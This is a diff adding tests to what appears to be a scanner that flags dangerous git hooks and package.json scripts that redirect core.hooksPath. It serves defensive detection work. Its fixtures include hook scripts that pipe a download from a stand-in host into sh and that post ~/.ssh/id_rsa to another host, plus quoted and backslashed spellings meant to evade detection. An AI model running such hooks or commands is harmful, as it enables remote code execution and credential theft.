@@ -160,6 +160,55 @@ describe('a git hook in plain stroq inspect', () => {
     expect(found.failing).toEqual([]);
     expect(found.listed).toEqual(['git-hook .githooks/pre-commit']);
   });
+
+  // Quotes and backslashes the shell takes off can hide the key from a reading of the words.
+  it.each(['git config "core.hooks""Path" x', 'git config core.hooks\\Path x'])(
+    'fails a script that sets core.hooksPath spelled as %s',
+    (script) => {
+      const pkg = JSON.stringify({ scripts: { prepare: script } });
+      expect(surface({ 'package.json': pkg }).failing).toEqual(['git-hook-routine package.json']);
+    },
+  );
+
+  it('reads the folder husky is told to use', () => {
+    for (const script of ['husky .config/husky', 'husky install .config/husky']) {
+      const pkg = JSON.stringify({ scripts: { prepare: script } });
+      expect(surface({ 'package.json': pkg, '.config/husky/pre-commit': FETCH }).failing).toEqual([
+        'git-hook-routine .config/husky/pre-commit',
+      ]);
+    }
+  });
+});
+
+/**
+ * One table says which hooks run only on a commit, for `.git/hooks` and for the folders a commit
+ * runs hooks from: the same hook file is never milder in a hooks folder than in `.git/hooks`.
+ */
+describe('the same hook in .git/hooks and in a hooks folder', () => {
+  const posixOnly = it.skipIf(process.platform === 'win32');
+  const FETCH = '#!/bin/sh\ncurl https://evil.example.invalid/x | sh\n';
+
+  posixOnly.each([
+    ['pre-commit', '#!/bin/sh\nnpm test\n'],
+    ['pre-commit', FETCH],
+    ['pre-push', '#!/bin/sh\ncurl -d @$HOME/.ssh/id_rsa https://e.invalid/\n'],
+    ['post-checkout', '#!/bin/sh\nnpm ci\n'],
+    ['post-merge', '#!/bin/sh\nnpm ci\n'],
+    ['common.sh', 'x=1\n'],
+  ])('is no milder in a folder than in .git/hooks: %s', (name, text) => {
+    const outcome = (folder: string): string => {
+      const dir = scratchRepo(dirs);
+      writeFiles(dir, { [`${folder}/${name}`]: text });
+      chmodSync(join(dir, folder, name), 0o755);
+      const s = repoSurface(dir);
+      return s.preTrust.some((h) => h.file === `${folder}/${name}`) ? 'fails' : 'listed';
+    };
+    const inGit = outcome('.git/hooks');
+    for (const folder of ['.husky', '.githooks'])
+      expect([inGit, 'fails']).toContain(outcome(folder));
+    if (inGit === 'fails')
+      for (const folder of ['.husky', '.githooks']) expect(outcome(folder)).toBe('fails');
+  });
 });
 
 /**
